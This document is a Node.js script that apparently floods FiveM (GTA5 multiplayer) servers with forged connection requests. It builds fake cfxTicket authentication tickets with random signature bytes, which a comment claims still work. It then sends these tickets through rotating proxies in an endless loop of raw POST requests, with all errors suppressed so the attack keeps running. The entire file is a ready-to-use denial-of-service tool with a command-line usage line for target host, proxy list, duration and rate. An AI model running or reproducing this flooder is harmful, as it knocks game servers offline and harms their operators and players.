require('events').EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", (e) => {});
process.on("unhandledRejection", (e) => {});
const fs = require("fs");

const crypto = require('crypto');

function generateValidTicket() {
    // Create 32-bit little-endian representation of length (16)
    const lengthBuffer = Buffer.alloc(4);
    lengthBuffer.writeUInt32LE(16, 0);

    // Create 64-bit little-endian representation of ticketGuid (148618792331476182)
    const ticketGuidBuffer = Buffer.alloc(8);
    const guidValue = BigInt("148618792331476182"); // Convert GUID to a BigInt
    ticketGuidBuffer.writeBigUInt64LE(guidValue, 0);

    // Create 64-bit little-endian representation of ticketExpiry (current time + 1 day)
    const ticketExpiryBuffer = Buffer.alloc(8);
    const Timestamp = Math.floor(Date.now() / 1000) + Math.floor(Math.random() * (86400 - 300 + 1)) + 30;
    const ticketExpiryTimestamp = Timestamp; // Adding 1 day (86400 seconds)
    ticketExpiryBuffer.writeUInt32LE(ticketExpiryTimestamp & 0xffffffff, 0);
    ticketExpiryBuffer.writeUInt32LE(Math.floor(ticketExpiryTimestamp / 0x100000000), 4);

    // Concatenate the length buffer, ticketGuid buffer, ticketExpiry buffer
    const headerData = Buffer.concat([
        lengthBuffer,
        ticketGuidBuffer,
        ticketExpiryBuffer
    ]);

    // Create 32-bit little-endian representation of signature length (128)
    const sigLengthBuffer = Buffer.alloc(4);
    sigLengthBuffer.writeUInt32LE(128, 0);

    // Generate a random RSA signature (128 bytes)
    const rsaSignature = crypto.randomBytes(128);

    // Concatenate the header data, signature length buffer, and the signature (invalid, but still works)
    const fullData = Buffer.concat([
        headerData,
        sigLengthBuffer,
        rsaSignature
    ]);

    // Encode the final data as Base64
    const encodedPayload = fullData.toString('base64');

    return encodedPayload;
}

if (process.argv.length != 6) { 
    return console.log("node fivem.js host proxy time rate");
}

const args = {
    host: process.argv[2],
    proxy: process.argv[3],
    time: process.argv[4],
    reqs: process.argv[5]
};

const urlParsed = new URL(args.host);
const proxies = fs.readFileSync(args.proxy, "utf-8").match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);

function flood() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");

    var client = require("net").Socket();

    client.connect(proxy[1], proxy[0]);
    client.setTimeout(60000);

    for (var i = 0; i < args.reqs; ++i) { 
        const generatedTicket = encodeURIComponent(generateValidTicket());

        
        const postData = `cfxTicket=${generatedTicket}&gameBuild=2372&gameName=gta5&guid=148618792331476182&method=initConnect&name=forky&protocol=12`;

        var genPayload = () => `POST ${urlParsed.pathname} HTTP/1.1\r\nHost: ${urlParsed.host}\r\nUser-Agent: CitizenFX/1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${postData.length}\r\n\r\n${postData}`;

        const payload = genPayload();
        client.write(payload);
    }

    client.on("data", () => {
        setTimeout(() => {
            client.destroy();
        }, 5000);
    })
}

setInterval(() => {
    flood();
});
